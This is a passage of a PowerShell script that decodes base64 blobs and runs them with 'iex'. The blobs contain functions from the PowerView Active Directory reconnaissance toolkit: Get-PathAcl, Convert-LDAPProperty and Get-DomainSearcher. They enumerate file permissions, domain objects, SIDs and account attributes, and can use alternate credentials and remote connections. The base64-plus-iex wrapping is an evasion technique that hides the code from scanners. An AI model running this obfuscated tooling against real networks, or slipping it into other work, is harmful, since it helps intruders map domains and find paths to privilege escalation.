AgICAgICAgICAgICAgICRGU1IKICAgICAgICAgICAgKQogICAgICAgICAgICAkQWNjZXNzTWFzayA9IEB7CiAgICAgICAgICAgICAgICBbdWludDMyXScweDgwMDAwMDAwJyA9ICdHZW5lcmljUmVhZCcKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4NDAwMDAwMDAnID0gJ0dlbmVyaWNXcml0ZScKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MjAwMDAwMDAnID0gJ0dlbmVyaWNFeGVjdXRlJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgxMDAwMDAwMCcgPSAnR2VuZXJpY0FsbCcKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDIwMDAwMDAnID0gJ01heGltdW1BbGxvd2VkJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMTAwMDAwMCcgPSAnQWNjZXNzU3lzdGVtU2VjdXJpdHknCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMTAwMDAwJyA9ICdTeW5jaHJvbml6ZScKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwODAwMDAnID0gJ1dyaXRlT3duZXInCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMDQwMDAwJyA9ICdXcml0ZURBQycKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMjAwMDAnID0gJ1JlYWRDb250cm9sJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAxMDAwMCcgPSAnRGVsZXRlJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDEwMCcgPSAnV3JpdGVBdHRyaWJ1dGVzJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDA4MCcgPSAnUmVhZEF0dHJpYnV0ZXMnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDQwJyA9ICdEZWxldGVDaGlsZCcKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMjAnID0gJ0V4ZWN1dGUvVHJhdmVyc2UnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDEwJyA9ICdXcml0ZUV4dGVuZGVkQXR0cmlidXRlcycKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMDgnID0gJ1JlYWRFeHRlbmRlZEF0dHJpYnV0ZXMnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDA0JyA9ICdBcHBlbmREYXRhL0FkZFN1YmRpcmVjdG9yeScKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMDInID0gJ1dyaXRlRGF0YS9BZGRGaWxlJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwMScgPSAnUmVhZERhdGEvTGlzdERpcmVjdG9yeScKICAgICAgICAgICAgfQogICAgICAgICAgICAkU2ltcGxlUGVybWlzc2lvbnMgPSBAewogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgxZjAxZmYnID0gJ0Z1bGxDb250cm9sJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMzAxYmYnID0gJ01vZGlmeScKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDIwMGE5JyA9ICdSZWFkQW5kRXhlY3V0ZScKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDIwMTlmJyA9ICdSZWFkQW5kV3JpdGUnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAyMDA4OScgPSAnUmVhZCcKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMTE2JyA9ICdXcml0ZScKICAgICAgICAgICAgfQogICAgICAgICAgICAkUGVybWlzc2lvbnMgPSBAKCkKICAgICAgICAgICAgJFBlcm1pc3Npb25zICs9ICRTaW1wbGVQZXJtaXNzaW9ucy5LZXlzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRGU1IgLWJhbmQgJF8pIC1lcSAkXykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTaW1wbGVQZXJtaXNzaW9uc1skX10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRlNSID0gJEZTUiAtYmFuZCAoLW5vdCAkXykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAkUGVybWlzc2lvbnMgKz0gJEFjY2Vzc01hc2suS2V5cyB8IFdoZXJlLU9iamVjdCB7ICRGU1IgLWJhbmQgJF8gfSB8IEZvckVhY2gtT2JqZWN0IHsgJEFjY2Vzc01hc2tbJF9dIH0KICAgICAgICAgICAgKCRQZXJtaXNzaW9ucyB8IFdoZXJlLU9iamVjdCB7JF99KSAtam9pbiAnLCcKICAgICAgICB9CiAgICAgICAgJENvbnZlcnRBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJENvbnZlcnRBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkTWFwcGVkQ29tcHV0ZXJzID0gQHt9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkVGFyZ2V0UGF0aCBpbiAkUGF0aCkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKCgkVGFyZ2V0UGF0aCAtTWF0Y2ggJ1xcXFwuKlxcLionKSAtYW5kICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkpIHsKICAgICAgICAgICAgICAgICAgICAkSG9zdENvbXB1dGVyID0gKE5ldy1PYmplY3QgU3lzdGVtLlVyaSgkVGFyZ2V0UGF0aCkpLkhvc3QKICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkTWFwcGVkQ29tcHV0ZXJzWyRIb3N0Q29tcHV0ZXJdKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIEFkZC1SZW1vdGVDb25uZWN0aW9uIC1Db21wdXRlck5hbWUgJEhvc3RDb21wdXRlciAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICAgICAgICAgICAgICAkTWFwcGVkQ29tcHV0ZXJzWyRIb3N0Q29tcHV0ZXJdID0gJFRydWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkQUNMID0gR2V0LUFjbCAtUGF0aCAkVGFyZ2V0UGF0aAogICAgICAgICAgICAgICAgJEFDTC5HZXRBY2Nlc3NSdWxlcygkVHJ1ZSwgJFRydWUsIFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcl0pIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRTSUQgPSAkXy5JZGVudGl0eVJlZmVyZW5jZS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICROYW1lID0gQ29udmVydEZyb20tU0lEIC1PYmplY3RTSUQgJFNJRCBAQ29udmVydEFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICRPdXQgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdQYXRoJyAkVGFyZ2V0UGF0aAogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRmlsZVN5c3RlbVJpZ2h0cycgKENvbnZlcnQtRmlsZVJpZ2h0IC1GU1IgJF8uRmlsZVN5c3RlbVJpZ2h0cy52YWx1ZV9fKQogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSWRlbnRpdHlSZWZlcmVuY2UnICROYW1lCiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJZGVudGl0eVNJRCcgJFNJRAogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQWNjZXNzQ29udHJvbFR5cGUnICRfLkFjY2Vzc0NvbnRyb2xUeXBlCiAgICAgICAgICAgICAgICAgICAgJE91dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRmlsZUFDTCcpCiAgICAgICAgICAgICAgICAgICAgJE91dAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtUGF0aEFjbF0gZXJyb3I6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgRU5EIHsKICAgICAgICAkTWFwcGVkQ29tcHV0ZXJzLktleXMgfCBSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbgogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29udmVydC1MREFQUHJvcGVydHkgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3VzdG9tT2JqZWN0JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICAkUHJvcGVydGllcwogICAgKQogICAgJE9iamVjdFByb3BlcnRpZXMgPSBAe30KICAgICRQcm9wZXJ0aWVzLlByb3BlcnR5TmFtZXMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgaWYgKCRfIC1uZSAnYWRzcGF0aCcpIHsKICAgICAgICAgICAgaWYgKCgkXyAtZXEgJ29iamVjdHNpZCcpIC1vciAoJF8gLWVxICdzaWRoaXN0b3J5JykpIHsKICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9ICRQcm9wZXJ0aWVzWyRfXSB8IEZvckVhY2gtT2JqZWN0IHsgKE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXIoJF8sIDApKS5WYWx1ZSB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkXyAtZXEgJ2dyb3VwdHlwZScpIHsKICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9ICRQcm9wZXJ0aWVzWyRfXVswXSAtYXMgJEdyb3VwVHlwZUVudW0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRfIC1lcSAnc2FtYWNjb3VudHR5cGUnKSB7CiAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAkUHJvcGVydGllc1skX11bMF0gLWFzICRTYW1BY2NvdW50VHlwZUVudW0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRfIC1lcSAnb2JqZWN0Z3VpZCcpIHsKICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9IChOZXctT2JqZWN0IEd1aWQgKCwkUHJvcGVydGllc1skX11bMF0pKS5HdWlkCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkXyAtZXEgJ3VzZXJhY2NvdW50Y29udHJvbCcpIHsKICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9ICRQcm9wZXJ0aWVzWyRfXVswXSAtYXMgJFVBQ0VudW0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRfIC1lcSAnbnRzZWN1cml0eWRlc2NyaXB0b3InKSB7CiAgICAgICAgICAgICAgICAkRGVzY3JpcHRvciA9IE5ldy1PYmplY3QgU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5SYXdTZWN1cml0eURlc2NyaXB0b3IgLUFyZ3VtZW50TGlzdCAkUHJvcGVydGllc1skX11bMF0sIDAKICAgICAgICAgICAgICAgIGlmICgkRGVzY3JpcHRvci5Pd25lcikgewogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWydPd25lciddID0gJERlc2NyaXB0b3IuT3duZXIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkRGVzY3JpcHRvci5Hcm91cCkgewogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWydHcm91cCddID0gJERlc2NyaXB0b3IuR3JvdXAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkRGVzY3JpcHRvci5EaXNjcmV0aW9uYXJ5QWNsKSB7CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJ0Rpc2NyZXRpb25hcnlBY2wnXSA9ICREZXNjcmlwdG9yLkRpc2NyZXRpb25hcnlBY2wKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkRGVzY3JpcHRvci5TeXN0ZW1BY2wpIHsKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1snU3lzdGVtQWNsJ10gPSAkRGVzY3JpcHRvci5TeXN0ZW1BY2wKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRfIC1lcSAnYWNjb3VudGV4cGlyZXMnKSB7CiAgICAgICAgICAgICAgICBpZiAoJFByb3BlcnRpZXNbJF9dWzBdIC1ndCBbRGF0ZVRpbWVdOjpNYXhWYWx1ZS5UaWNrcykgewogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9ICJORVZFUiIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9IFtkYXRldGltZV06OmZyb21maWxldGltZSgkUHJvcGVydGllc1skX11bMF0pCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICggKCRfIC1lcSAnbGFzdGxvZ29uJykgLW9yICgkXyAtZXEgJ2xhc3Rsb2dvbnRpbWVzdGFtcCcpIC1vciAoJF8gLWVxICdwd2RsYXN0c2V0JykgLW9yICgkXyAtZXEgJ2xhc3Rsb2dvZmYnKSAtb3IgKCRfIC1lcSAnYmFkUGFzc3dvcmRUaW1lJykgKSB7CiAgICAgICAgICAgICAgICBpZiAoJFByb3BlcnRpZXNbJF9dWzBdIC1pcyBbU3lzdGVtLk1hcnNoYWxCeVJlZk9iamVjdF0pIHsKICAgICAgICAgICAgICAgICAgICAkVGVtcCA9ICRQcm9wZXJ0aWVzWyRfXVswXQogICAgICAgICAgICAgICAgICAgIFtJbnQzMl0kSGlnaCA9ICRUZW1wLkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJ0hpZ2hQYXJ0JywgW1N5c3RlbS5SZWZsZWN0aW9uLkJpbmRpbmdGbGFnc106OkdldFByb3BlcnR5LCAkTnVsbCwgJFRlbXAsICROdWxsKQogICAgICAgICAgICAgICAgICAgIFtJbnQzMl0kTG93ICA9ICRUZW1wLkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJ0xvd1BhcnQnLCAgW1N5c3RlbS5SZWZsZWN0aW9uLkJpbmRpbmdGbGFnc106OkdldFByb3BlcnR5LCAkTnVsbCwgJFRlbXAsICROdWxsKQogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9IChbZGF0ZXRpbWVdOjpGcm9tRmlsZVRpbWUoW0ludDY0XSgiMHh7MDp4OH17MTp4OH0iIC1mICRIaWdoLCAkTG93KSkpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAoW2RhdGV0aW1lXTo6RnJvbUZpbGVUaW1lKCgkUHJvcGVydGllc1skX11bMF0pKSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRQcm9wZXJ0aWVzWyRfXVswXSAtaXMgW1N5c3RlbS5NYXJzaGFsQnlSZWZPYmplY3RdKSB7CiAgICAgICAgICAgICAgICAkUHJvcCA9ICRQcm9wZXJ0aWVzWyRfXQogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkVGVtcCA9ICRQcm9wWyRfXVswXQogICAgICAgICAgICAgICAgICAgIFtJbnQzMl0kSGlnaCA9ICRUZW1wLkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJ0hpZ2hQYXJ0JywgW1N5c3RlbS5SZWZsZWN0aW9uLkJpbmRpbmdGbGFnc106OkdldFByb3BlcnR5LCAkTnVsbCwgJFRlbXAsICROdWxsKQogICAgICAgICAgICAgICAgICAgIFtJbnQzMl0kTG93ICA9ICRUZW1wLkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJ0xvd1BhcnQnLCAgW1N5c3RlbS5SZWZsZWN0aW9uLkJpbmRpbmdGbGFnc106OkdldFByb3BlcnR5LCAkTnVsbCwgJFRlbXAsICROdWxsKQogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9IFtJbnQ2NF0oIjB4ezA6eDh9ezE6eDh9IiAtZiAkSGlnaCwgJExvdykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbQ29udmVydC1MREFQUHJvcGVydHldIGVycm9yOiAkXyIKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAkUHJvcFskX10KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRQcm9wZXJ0aWVzWyRfXS5jb3VudCAtZXEgMSkgewogICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gJFByb3BlcnRpZXNbJF9dWzBdCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAkUHJvcGVydGllc1skX10KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIHRyeSB7CiAgICAgICAgTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgLVByb3BlcnR5ICRPYmplY3RQcm9wZXJ0aWVzCiAgICB9CiAgICBjYXRjaCB7CiAgICAgICAgV3JpdGUtV2FybmluZyAiW0NvbnZlcnQtTERBUFByb3BlcnR5XSBFcnJvciBwYXJzaW5nIExEQVAgcHJvcGVydGllcyA6ICRfIgogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblNlYXJjaGVyIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlUHJlZml4LAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQgPSAxMjAsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlY3VyaXR5TWFza3MsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICREb21haW4KICAgICAgICAgICAgaWYgKCRFTlY6VVNFUkROU0RPTUFJTiAtYW5kICgkRU5WOlVTRVJETlNET01BSU4uVHJpbSgpIC1uZSAnJykpIHsKICAgICAgICAgICAgICAgICRVc2VyRG9tYWluID0gJEVOVjpVU0VSRE5TRE9NQUlOCiAgICAgICAgICAgICAgICBpZiAoJEVOVjpMT0dPTlNFUlZFUiAtYW5kICgkRU5WOkxPR09OU0VSVkVSLlRyaW0oKSAtbmUgJycpIC1hbmQgJFVzZXJEb21haW4pIHsKICAgICAgICAgICAgICAgICAgICAkQmluZFNlcnZlciA9ICIkKCRFTlY6TE9HT05TRVJWRVIgLXJlcGxhY2UgJ1xcJywnJykuJFVzZXJEb21haW4iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkRG9tYWluT2JqZWN0ID0gR2V0LURvbWFpbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICAkQmluZFNlcnZlciA9ICgkRG9tYWluT2JqZWN0LlBkY1JvbGVPd25lcikuTmFtZQogICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gJERvbWFpbk9iamVjdC5OYW1lCiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJEVOVjpVU0VSRE5TRE9NQUlOIC1hbmQgKCRFTlY6VVNFUkROU0RPTUFJTi5UcmltKCkgLW5lICcnKSkgewogICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gJEVOVjpVU0VSRE5TRE9NQUlOCiAgICAgICAgICAgIGlmICgkRU5WOkxPR09OU0VSVkVSIC1hbmQgKCRFTlY6TE9HT05TRVJWRVIuVHJpbSgpIC1uZSAnJykgLWFuZCAkVGFyZ2V0RG9tYWluKSB7CiAgICAgICAgICAgICAgICAkQmluZFNlcnZlciA9ICIkKCRFTlY6TE9HT05TRVJWRVIgLXJlcGxhY2UgJ1xcJywnJykuJFRhcmdldERvbWFpbiIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgd3JpdGUtdmVyYm9zZSAiZ2V0LWRvbWFpbiIKICAgICAgICAgICAgJERvbWFpbk9iamVjdCA9IEdldC1Eb21haW4KICAgICAgICAgICAgJEJpbmRTZXJ2ZXIgPSAoJERvbWFpbk9iamVjdC5QZGNSb2xlT3duZXIpLk5hbWUKICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICREb21haW5PYmplY3QuTmFtZQogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgewogICAgICAgICAgICAkQmluZFNlcnZlciA9ICRTZXJ2ZXIKICAgICAgICB9CiAgICAgICAgJFNlYXJjaFN0cmluZyA9ICdMREFQOi8vJwogICAgICAgIGlmICgkQmluZFNlcnZlciAtYW5kICgkQmluZFNlcnZlci5UcmltKCkgLW5lICcnKSkgewogICAgICAgICAgICAkU2VhcmNoU3RyaW5nICs9ICRCaW5kU2VydmVyCiAgICAgICAgICAgIGlmICgkVGFyZ2V0RG9tYWluKSB7CiAgICAgICAgICAgICAgICAkU2VhcmNoU3RyaW5nICs9ICcvJwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2VQcmVmaXgnXSkgewogICAgICAgICAgICAkU2VhcmNoU3RyaW5nICs9ICRTZWFyY2hCYXNlUHJlZml4ICsgJywnCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgewogICAgICAgICAgICBpZiAoJFNlYXJjaEJhc2UgLU1hdGNoICdeR0M6Ly8nKSB7CiAgICAgICAgICAgICAgICAkRE4gPSAkU2VhcmNoQmFzZS5Ub1VwcGVyKCkuVHJpbSgnLycpCiAgICAgICAgICAgICAgICAkU2VhcmNoU3RyaW5nID0gJycKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIGlmICgkU2VhcmNoQmFzZSAtbWF0Y2ggJ15MREFQOi8vJykgewogICAgICAgICAgICAgICAgICAgIGlmICgkU2VhcmNoQmFzZSAtbWF0Y2ggIkxEQVA6Ly8uKy8uKyIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaFN0cmluZyA9ICcnCiAgICAgICAgICAgICAgICAgICAgICAgICRETiA9ICRTZWFyY2hCYXNlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkRE4gPSAkU2VhcmNoQmFzZS5TdWJTdHJpbmcoNykKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkRE4gPSAkU2VhcmNoQmFzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBpZiAoJFRhcmdldERvbWFpbiAtYW5kICgkVGFyZ2V0RG9tYWluLlRyaW0oKSAtbmUgJycpKSB7CiAgICAgICAgICAgICAgICAkRE4gPSAiREM9JCgkVGFyZ2V0RG9tYWluLlJlcGxhY2UoJy4nLCAnLERDPScpKSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkU2VhcmNoU3RyaW5nICs9ICRETgogICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluU2VhcmNoZXJdIHNlYXJjaCBiYXNlOiAkU2VhcmNoU3RyaW5nIgogICAgICAgIGlmICgkQ3JlZGVudGlhbCAtbmUgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSkgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblNlYXJjaGVyXSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMgZm9yIExEQVAgY29ubmVjdGlvbiIKICAgICAgICAgICAgJERvbWFpbk9iamVjdCA9IE5ldy1PYmplY3QgRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkoJFNlYXJjaFN0cmluZywgJENyZWRlbnRpYWwuVXNlck5hbWUsICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQpCiAgICAgICAgICAgICRTZWFyY2hlciA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcm